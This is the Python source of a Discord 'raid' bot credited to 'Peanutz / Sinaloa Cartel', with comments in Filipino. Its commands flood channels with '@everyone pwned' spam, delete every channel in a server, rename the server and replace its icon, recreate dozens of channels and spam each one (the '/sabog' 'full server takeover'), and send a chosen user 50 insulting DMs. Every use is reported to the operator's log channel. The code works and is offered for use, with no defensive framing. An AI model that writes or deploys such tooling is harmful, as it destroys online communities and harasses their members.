import discord
from discord import app_commands
from discord.ext import commands
import os
import asyncio
import time
import psutil
import sys

# ================================================================
#  DETECT ENVIRONMENT
#  Pag nasa Railway = walang pystyle, walang input(), token sa env var
#  Pag nasa Termux  = pystyle + theme picker
# ================================================================

IS_RAILWAY = (
    os.getenv("RAILWAY_ENVIRONMENT") is not None or
    os.getenv("RAILWAY_PROJECT_ID") is not None or
    os.getenv("DISCORD_TOKEN") is not None
)

if not IS_RAILWAY:
    try:
        from pystyle import Colors, Colorate, Center
    except ImportError:
        IS_RAILWAY = True  # fallback kung wala pystyle

# ================================================================
#  CONFIGURATION — EDIT THIS SECTION ONLY
# ================================================================

# Railway: i-set ang DISCORD_TOKEN sa Railway dashboard → Variables
# Termux:  i-paste ang token sa BOT_TOKEN below
BOT_TOKEN = os.getenv("DISCORD_TOKEN", "ILAGAY_TOKEN_DITO")

OWNER_ID          = 1430801275653718128
STATUS_CHANNEL_ID = 1474960252775694544
LOGS_CHANNEL_ID   = 1475069302221836423
LOG_IMAGE_URL     = (
    "https://cdn.discordapp.com/attachments/1471114661402251374/"
    "1475074027285647421/processed-image.png?ex=699c293d&is=699ad7bd"
    "&hm=b9c17e47dc2aefcf1bf312b6852951920283848fca914313e4ee299a86050714&"
)

# ================================================================
#  BLAME SETTINGS
# ================================================================

BLAME_MESSAGE = "# BOBO KA NAABOTAN KA NI PEANUTZ BONAK"
BLAME_COUNT   = 50

# ================================================================
#  RAID EMBED SETTINGS
# ================================================================

REPLY_MESSAGE = """# ||@everyone ||
**# • pwned by PEANUTZ!**
> • **//@ Peanutz**
> • **//@ Khaleed**
> • **//@ Hessa**
> • https://discord.gg/sinaloaa
~~# server dead~~
**// @ DOMINATED BY PEANUTZ!**
https://cdn.discordapp.com/attachments/1471114661402251374/1475074027285647421/processed-image.png?ex=699c293d&is=699ad7bd&hm=b9c17e47dc2aefcf1bf312b6852951920283848fca914313e4ee299a86050714&"""

REPLY_MESSAGES    = [REPLY_MESSAGE] * 10
EMBED_TITLE       = "ALWAYS LUVZ PEANUTZ"
EMBED_DESCRIPTION = "SINALOA ON TOP BITCHASS"
EMBED_IMAGE_URL   = (
    "https://cdn.discordapp.com/attachments/1471114661402251374/"
    "1475074027285647421/processed-image.png?ex=699c293d&is=699ad7bd"
    "&hm=b9c17e47dc2aefcf1bf312b6852951920283848fca914313e4ee299a86050714&"
)
BUTTON_LABEL = "$INALOAA"

# ================================================================
#  BANNER + THEME  (Termux only — hindi gagana sa Railway)
# ================================================================

BANNER = r"""
 $$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\  $$\       $$$$$$\   $$$$$$\
$$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$ |     $$  __$$\ $$  __$$\
$$ /  \__|  $$ |  $$$$\ $$ |$$ /  $$ |$$ |     $$ /  $$ |$$ /  $$ |
\$$$$$$\    $$ |  $$ $$\$$ |$$$$$$$$ |$$ |     $$ |  $$ |$$$$$$$$ |
 \____$$\   $$ |  $$ \$$$$ |$$  __$$ |$$ |     $$ |  $$ |$$  __$$ |
$$\   $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |     $$ |  $$ |$$ |  $$ |
\$$$$$$  |$$$$$$\ $$ | \$$ |$$ |  $$ |$$$$$$$$\ $$$$$$  |$$ |  $$ |
 \______/ \______|\__|  \__|\__|  \__|\________|\______/ \__|  \__|
"""

if not IS_RAILWAY:
    current_fg1 = Colors.DynamicMIX((Colors.red, Colors.orange, Colors.yellow))
    current_fg2 = Colors.DynamicMIX((Colors.orange, Colors.red))

    def clear():
        os.system("cls" if os.name == "nt" else "clear")

    def header():
        print(Colorate.Horizontal(current_fg1, Center.XCenter(BANNER)))
        print(Colorate.Horizontal(current_fg2, Center.XCenter("=" * 60)))
        print(Colorate.Horizontal(current_fg1, Center.XCenter("MADE BY PEANUTZ / SINALOA CARTEL")))
        print(Colorate.Horizontal(current_fg2, Center.XCenter("=" * 60)))
        print()

    def change_theme():
        global current_fg1, current_fg2
        clear()
        header()
        print(Colorate.Horizontal(current_fg1, Center.XCenter("Choose Your Theme")))
        print(Colorate.Horizontal(Colors.DynamicMIX((Colors.red, Colors.blue, Colors.green)),    Center.XCenter("1. Color Cycle")))
        print(Colorate.Horizontal(Colors.DynamicMIX((Colors.cyan, Colors.blue)),                 Center.XCenter("2. Ocean")))
        print(Colorate.Horizontal(Colors.DynamicMIX((Colors.red, Colors.orange, Colors.yellow)), Center.XCenter("3. Fire")))
        print(Colorate.Horizontal(Colors.DynamicMIX((Colors.pink, Colors.purple, Colors.blue)),  Center.XCenter("4. Cotton Candy")))
        print(Colorate.Horizontal(Colors.DynamicMIX((Colors.green, Colors.black)),               Center.XCenter("5. Matrix")))

        choice = input(Colorate.Horizontal(current_fg1, Center.XCenter("Enter number (1-5): "))).strip()

        themes = {
            '1': ((Colors.red, Colors.blue, Colors.green),       (Colors.green, Colors.blue, Colors.red), "Color Cycle"),
            '2': ((Colors.cyan, Colors.blue),                    (Colors.blue, Colors.cyan),               "Ocean"),
            '3': ((Colors.red, Colors.orange, Colors.yellow),    (Colors.orange, Colors.red),              "Fire"),
            '4': ((Colors.pink, Colors.purple, Colors.blue),     (Colors.blue, Colors.pink),               "Cotton Candy"),
            '5': ((Colors.green, Colors.black),                  (Colors.black, Colors.green),             "Matrix"),
        }

        if choice in themes:
            col1, col2, name = themes[choice]
            current_fg1 = Colors.DynamicMIX(col1)
            current_fg2 = Colors.DynamicMIX(col2)
            clear()
            header()
            print(Colorate.Horizontal(current_fg1, Center.XCenter(f"✓ {name} theme applied!")))
        else:
            print(Colorate.Horizontal(Colors.red, Center.XCenter("Invalid choice!")))

    def print_menu():
        for cmd, desc in [
            ("/raid",       "Send embed with reveal button"),
            ("/setchannel", "Send embed to specific channel"),
            ("/say",        "Send custom message"),
            ("/createc",    "Create multiple channels"),
            ("/deletec",    "Delete all channels"),
            ("/sabog",      "Full server takeover"),
            ("/blame",      "DM a user"),
        ]:
            print(Colorate.Horizontal(current_fg1, f"  {cmd:<16}— {desc}"))
        print()

# ================================================================
#  BOT SETUP
# ================================================================

START_TIME = time.time()

intents                 = discord.Intents.default()
intents.guilds          = True
intents.message_content = True
bot  = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ================================================================
#  DUPLICATE CHECK TRACKING
#  - Status embed: may cooldown ng 60 seconds
#  - Log embeds:   1 log per user per command per minute
# ================================================================

_last_status_time: float = 0.0
_STATUS_COOLDOWN: int    = 60   # seconds

_logged_commands: set = set()

def _log_key(user_str: str, command: str) -> str:
    """1 log per user per command per minute."""
    minute_bucket = int(time.time() // 60)
    return f"{user_str}:{command}:{minute_bucket}"

# ================================================================
#  HELPERS — LOG + STATUS EMBEDS
# ================================================================

def black_red_embed(title: str, fields: dict, image_url: str = None) -> discord.Embed:
    embed = discord.Embed(title=title, color=0xCC0000)
    embed.description = "━━━━━━━━━━━━━━━━━━━━━━"
    for name, value in fields.items():
        embed.add_field(name=name, value=str(value), inline=False)
    if image_url:
        embed.set_thumbnail(url=image_url)
    embed.set_footer(text="SINALOA LOGGER")
    return embed

async def send_log(bot_instance, fields: dict):
    """Send log embed — may duplicate check: 1 log per user per command per minute."""
    global _logged_commands
    user_str = fields.get("User", "unknown")
    command  = fields.get("Command", "unknown")
    key      = _log_key(user_str, command)

    if key in _logged_commands:
        return  # duplicate within same minute — skip

    _logged_commands.add(key)
    if len(_logged_commands) > 500:
        _logged_commands.clear()  # cleanup para hindi lumaki

    ch = bot_instance.get_channel(LOGS_CHANNEL_ID)
    if not ch:
        return
    embed = black_red_embed("Command Executed", fields, LOG_IMAGE_URL)
    try:
        await ch.send(embed=embed)
    except Exception:
        pass

async def send_status(bot_instance):
    """Send status embed — may 60-second cooldown para walang duplicate."""
    global _last_status_time
    now = time.time()

    if now - _last_status_time < _STATUS_COOLDOWN:
        return  # too soon — skip

    _last_status_time = now

    ch = bot_instance.get_channel(STATUS_CHANNEL_ID)
    if not ch:
        return

    uptime_secs = int(now - START_TIME)
    h, rem      = divmod(uptime_secs, 3600)
    m, s        = divmod(rem, 60)
    try:
        mem_mb = psutil.Process(os.getpid()).memory_info().rss // (1024 * 1024)
    except Exception:
        mem_mb = "N/A"

    fields = {
        "Status":  "ONLINE — Operating normally.",
        "Ping":    f"{round(bot_instance.latency * 1000)}ms",
        "Uptime":  f"{h}h {m}m {s}s",
        "Memory":  f"{mem_mb} MB used",
        "Version": "v4.0 Stable",
    }
    embed = black_red_embed("BOT STATUS — ONLINE", fields, LOG_IMAGE_URL)
    try:
        await ch.send(embed=embed)
    except Exception:
        pass

# ================================================================
#  VIEWS
# ================================================================

class RevealButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label=BUTTON_LABEL, style=discord.ButtonStyle.danger, custom_id="reveal_button")
    async def reveal(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for msg in REPLY_MESSAGES:
            await interaction.followup.send(content=msg)

        await send_log(interaction.client, {
            "User":          f"{interaction.user} [{interaction.user.id}]",
            "Command":       "/raid",
            "Messages Sent": str(len(REPLY_MESSAGES)),
            "Server":        f"{interaction.guild.name} [{interaction.guild.id}]" if interaction.guild else "DM",
            "Channel":       f"{interaction.channel.name} [{interaction.channel.id}]" if interaction.channel else "N/A",
        })


class ConfirmDeleteView(discord.ui.View):
    def __init__(self, requester_id: int):
        super().__init__(timeout=30)
        self.requester_id = requester_id

    @discord.ui.button(label="Yes, delete all", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.requester_id:
            await interaction.response.send_message("You did not trigger this command.", ephemeral=True)
            return

        self.stop()
        await interaction.response.send_message("Deleting all channels...", ephemeral=True)

        guild   = interaction.guild
        deleted = 0
        failed  = 0

        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"/deletec by {interaction.user}")
                deleted += 1
                await asyncio.sleep(0.5)
            except Exception:
                failed += 1

        try:
            log_ch = await guild.create_text_channel("bot-log")
            await log_ch.send(f"Done. {deleted} deleted. {failed} failed.\nBy: {interaction.user.mention}")
        except Exception:
            pass

        await send_log(interaction.client, {
            "User":             f"{interaction.user} [{interaction.user.id}]",
            "Command":          "/deletec",
            "Channels Deleted": str(deleted),
            "Server":           f"{guild.name} [{guild.id}]",
        })

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.requester_id:
            return
        self.stop()
        await interaction.response.send_message("Cancelled.", ephemeral=True)

# ================================================================
#  COMMANDS
# ================================================================

@tree.command(name="raid", description="Mang raid ka hangga5 gusto mo pukinginaka")
async def raid_command(interaction: discord.Interaction):
    embed = discord.Embed(title=EMBED_TITLE, description=EMBED_DESCRIPTION, color=discord.Color.red())
    embed.set_image(url=EMBED_IMAGE_URL)
    embed.set_footer(text="Powered by Peanutz")
    await interaction.response.send_message(embed=embed, view=RevealButton(), ephemeral=True)


@tree.command(name="setchannel", description="[Owner] Send the embed to a specific channel.")
@app_commands.describe(channel="The channel to send the embed to.")
async def setchannel_command(interaction: discord.Interaction, channel: discord.TextChannel):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("Owner only.", ephemeral=True)
        return

    embed = discord.Embed(title=EMBED_TITLE, description=EMBED_DESCRIPTION, color=discord.Color.red())
    embed.set_image(url=EMBED_IMAGE_URL)
    embed.set_footer(text="Powered by Peanutz")
    await channel.send(embed=embed, view=RevealButton())
    await interaction.response.send_message(f"Embed sent to {channel.mention}.", ephemeral=True)

    await send_log(bot, {
        "User":    f"{interaction.user} [{interaction.user.id}]",
        "Command": "/setchannel",
        "Channel": f"{channel.name} [{channel.id}]",
        "Server":  f"{interaction.guild.name} [{interaction.guild.id}]",
    })


@tree.command(name="say", description="Send a custom message to the channel.")
@app_commands.describe(text="The message you want to send.")
async def say_command(interaction: discord.Interaction, text: str):
    await interaction.response.send_message(text)

    await send_log(bot, {
        "User":    f"{interaction.user} [{interaction.user.id}]",
        "Command": "/say",
        "Message": text[:200],
        "Server":  f"{interaction.guild.name} [{interaction.guild.id}]" if interaction.guild else "DM",
        "Channel": f"{interaction.channel.name} [{interaction.channel.id}]" if hasattr(interaction.channel, 'name') else "N/A",
    })


@tree.command(name="createc", description="Create multiple channels in the server.")
@app_commands.describe(
    count="Number of channels to create (max 50).",
    name="Base name for the channels.",
    category="Category to place the channels in (optional).",
)
async def createc(interaction: discord.Interaction, count: int, name: str, category: str = None):
    if not interaction.user.guild_permissions.manage_channels and interaction.user.id != OWNER_ID:
        await interaction.response.send_message("You need the Manage Channels permission.", ephemeral=True)
        return

    if not 1 <= count <= 50:
        await interaction.response.send_message("Count must be between 1 and 50.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    guild           = interaction.guild
    target_category = None

    if category:
        target_category = discord.utils.get(guild.categories, name=category)
        if not target_category:
            target_category = await guild.create_category(category)

    created = []
    failed  = []

    for i in range(1, count + 1):
        ch_name = f"{name}-{i}" if count > 1 else name
        try:
            ch = await guild.create_text_channel(name=ch_name, category=target_category)
            created.append(ch.mention)
            await asyncio.sleep(0.5)
        except Exception as e:
            failed.append(f"{ch_name} ({e})")

    lines = [f"**{len(created)} channel(s) created.**\n"] + created[:20]
    if len(created) > 20:
        lines.append(f"...and {len(created) - 20} more.")
    if failed:
        lines.append(f"\nFailed: {len(failed)}")

    await interaction.followup.send("\n".join(lines), ephemeral=True)

    await send_log(bot, {
        "User":             f"{interaction.user} [{interaction.user.id}]",
        "Command":          "/createc",
        "Channels Created": str(len(created)),
        "Base Name":        name,
        "Server":           f"{guild.name} [{guild.id}]",
    })


@tree.command(name="deletec", description="Delete ALL channels in the server.")
async def deletec(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
        await interaction.response.send_message("You need the Administrator permission.", ephemeral=True)
        return

    guild = interaction.guild
    await interaction.response.send_message(
        f"**Warning:** This will permanently delete all {len(guild.channels)} channels in **{guild.name}**.\nThis cannot be undone. Are you sure?",
        view=ConfirmDeleteView(interaction.user.id),
        ephemeral=True,
    )


@tree.command(name="sabog", description="Full server takeover.")
@app_commands.describe(
    channel_name="Base name for the new channels",
    channel_count="How many channels to create (max 50)",
    message="Message to send in every channel",
    server_name="New name for the server (optional)",
    icon_url="Direct image URL for the new server icon (optional)",
)
async def sabog(interaction: discord.Interaction, channel_name: str, channel_count: int,
                message: str, server_name: str = "", icon_url: str = ""):

    if not interaction.guild:
        await interaction.response.send_message("This command must be used inside a server.", ephemeral=True)
        return

    if not 1 <= channel_count <= 50:
        await interaction.response.send_message("Channel count must be between 1 and 50.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild

    if server_name:
        try:
            await guild.edit(name=server_name)
        except Exception as e:
            await interaction.followup.send(f"Could not rename server: {e}", ephemeral=True)

    if icon_url:
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
                    else:
                        await interaction.followup.send(f"Icon fetch failed: HTTP {resp.status}", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"Could not change icon: {e}", ephemeral=True)

    for channel in list(guild.channels):
        try:
            await channel.delete(reason=f"/sabog by {interaction.user}")
            await asyncio.sleep(0.3)
        except Exception:
            pass

    new_channels = []
    for i in range(1, channel_count + 1):
        n = f"{channel_name}-{i}" if channel_count > 1 else channel_name
        try:
            ch = await guild.create_text_channel(name=n)
            new_channels.append(ch)
            await asyncio.sleep(0.3)
        except Exception:
            pass

    async def send_to(ch):
        try:
            await ch.send(message)
        except Exception:
            pass

    await asyncio.gather(*[send_to(ch) for ch in new_channels])

    await send_log(bot, {
        "User":             f"{interaction.user} [{interaction.user.id}]",
        "Command":          "/sabog",
        "Channels Created": str(len(new_channels)),
        "Message":          message[:100],
        "Server":           f"{guild.name} [{guild.id}]",
    })


@tree.command(name="blame", description="DM a user a set number of times.")
@app_commands.describe(user="The user to DM.")
async def blame(interaction: discord.Interaction, user: discord.User):
    await interaction.response.send_message(f"Sending {BLAME_COUNT} DMs to {user.mention}...")

    sent = 0
    for _ in range(BLAME_COUNT):
        try:
            await user.send(BLAME_MESSAGE)
            sent += 1
            await asyncio.sleep(0.5)
        except discord.errors.Forbidden:
            await interaction.followup.send(f"Cannot DM {user.mention} — DMs are closed.")
            break
        except Exception as e:
            await interaction.followup.send(f"Error: {e}")
            break

    await interaction.followup.send(f"Done. Sent {sent}/{BLAME_COUNT} to {user.mention}.")

    await send_log(bot, {
        "User":    f"{interaction.user} [{interaction.user.id}]",
        "Command": "/blame",
        "Target":  f"{user} [{user.id}]",
        "Sent":    f"{sent}/{BLAME_COUNT}",
    })

# ================================================================
#  STATUS LOOP — nagpo-post every 30 minutes
#  NOTE: hindi na mag-post agad sa on_ready — para sa status loop lang
# ================================================================

async def status_loop():
    await bot.wait_until_ready()
    while not bot.is_closed():
        await asyncio.sleep(1800)  # hintayin muna ng 30 min bago mag-post
        await send_status(bot)

# ================================================================
#  EVENTS
# ================================================================

@bot.event
async def on_ready():
    bot.add_view(RevealButton())
    bot.loop.create_task(status_loop())
    try:
        await tree.sync()

        if IS_RAILWAY:
            print("=" * 55)
            print("  SINALOA BOT v4 — RAILWAY MODE")
            print("  MADE BY PEANUTZ / SINALOA CARTEL")
            print("=" * 55)
            print(f"  Logged in as : {bot.user} (ID: {bot.user.id})")
            print(f"  Guilds       : {len(bot.guilds)}")
            print("  Slash cmds   : synced and ready")
            print("=" * 55)
        else:
            clear()
            header()
            print_menu()
            print(Colorate.Horizontal(current_fg1, f"  Logged in as: {bot.user} (ID: {bot.user.id})"))
            print(Colorate.Horizontal(current_fg2, "  Status: All slash commands synced and ready."))
            print()

        # Post startup status once (cooldown ensures walang double)
        await send_status(bot)

    except discord.errors.HTTPException as e:
        if e.code == 50240:
            print("[ERROR 50240] Entry Point conflict.")
            print("Developer Portal -> Your App -> Installation -> uncheck Entry Point.")
        else:
            print(f"Sync error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

# ================================================================
#  RUN
# ================================================================

if __name__ == "__main__":
    if not IS_RAILWAY:
        change_theme()

    token = BOT_TOKEN
    if not token or token == "ILAGAY_TOKEN_DITO":
        print("ERROR: Walang token. I-set ang DISCORD_TOKEN sa Railway Variables.")
        sys.exit(1)

    if not IS_RAILWAY:
        print(Colorate.Horizontal(current_fg1, Center.XCenter("Connecting to Discord...")))
    else:
        print("Connecting to Discord...")

    try:
        bot.run(token, log_handler=None)
    except discord.errors.LoginFailure:
        print("ERROR: Invalid or expired token.")
        print("Kumuha ng bago: discord.com/developers/applications")
    except Exception as e:
        print(f"ERROR: {e}")
